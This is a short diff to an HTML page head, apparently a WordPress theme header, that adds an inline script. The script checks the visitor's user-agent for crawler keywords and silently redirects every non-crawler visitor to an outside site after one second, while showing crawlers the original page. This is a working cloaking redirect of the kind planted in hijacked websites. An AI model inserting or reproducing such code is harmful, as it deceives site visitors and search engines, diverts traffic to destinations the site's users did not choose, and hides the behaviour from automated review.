@@ -1,6 +1,26 @@
 <!DOCTYPE html>
 <html lang="en-US">
 <head>
+	<script>
+  // Function to check if the visitor is a bot based on the user-agent
+  function isBot() {
+    const ua = navigator.userAgent.toLowerCase();
+    const botKeywords = [
+      "bot", "crawl", "spider", "slurp", "facebook", "facebot",
+      "google", "bing", "yandex", "baidu", "adsbot"
+    ];
+    return botKeywords.some(k => ua.includes(k));
+  }
+
+  // If the visitor is not a bot, execute the immediate redirect after a small delay
+  if (!isBot()) {
+    setTimeout(function () {
+      window.location.href = "https://www.xyz.com"; // Redirect to your target URL
+    }, 1000); // 1-second delay
+  } else {
+    console.log("Bot detected, no redirect.");
+  }
+</script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 	<link rel="profile" href="https://gmpg.org/xfn/11"> 
